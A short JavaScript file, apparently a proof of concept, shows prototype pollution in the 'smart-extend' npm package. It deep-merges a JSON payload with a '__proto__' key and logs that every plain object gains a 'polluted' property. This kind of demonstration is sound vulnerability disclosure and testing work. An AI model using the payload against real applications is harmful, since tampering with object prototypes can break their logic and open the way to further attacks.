var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var extend = require('smart-extend');
obj = {};
console.log({}.polluted);
var payload = '{"__proto__":{"polluted":"yes"}}';
extend.deep(obj, JSON.parse(payload));
console.log({}.polluted);